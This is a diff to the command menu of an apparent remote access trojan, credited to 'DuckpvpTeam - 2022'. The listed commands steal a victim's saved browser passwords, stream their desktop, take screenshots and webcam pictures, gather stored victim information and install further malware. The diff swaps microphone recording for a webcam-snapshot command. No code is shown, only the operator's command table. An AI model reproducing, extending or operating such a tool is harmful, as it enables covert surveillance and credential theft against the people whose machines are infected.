@@ -8,10 +8,7 @@
                                              dP                             
 credits: DuckpvpTeam - 2022
 
-prefix: 'ds'
-usage: 'ds <command>'
-
-victim's website: 'http://<victim's ip>:8080'
+victim's website: 'http://<victim's ip>'
 
 our team: 'https://canarddu38.github.io/DuckpvpTeam'
 
@@ -42,10 +39,9 @@ commands:
 |--------------------------------------- [STEALING] --------------------------------------------|
 | steal_pwd      | steal_pwd <firefox/google>       | get all victim's browser saved passwords  |
 |----------------------------------------- [SPY] -----------------------------------------------|
-| recordmicro    | recordmicro <time in second>     | record victim's micro for 'time'seconds   |
-| desktopstream  | desktopstream                    | stream in real time victim's desktop      |
+| desktop_stream | desktop_stream <start/stop>      | stream in real time victim's desktop      |
 | screenshot     | screenshot                       | take screenshot                           |
-|                |                                  | (located in the victim's website)         |
+| webcam_snap    | webcam_snap                      | take webcam picture                       |
 | info           | info                             | get all stored victim's infos             |
 |----------------------------------------- [EVIL] ----------------------------------------------|
 | malware        | malware <malware name>           | add malware to vour victim                |
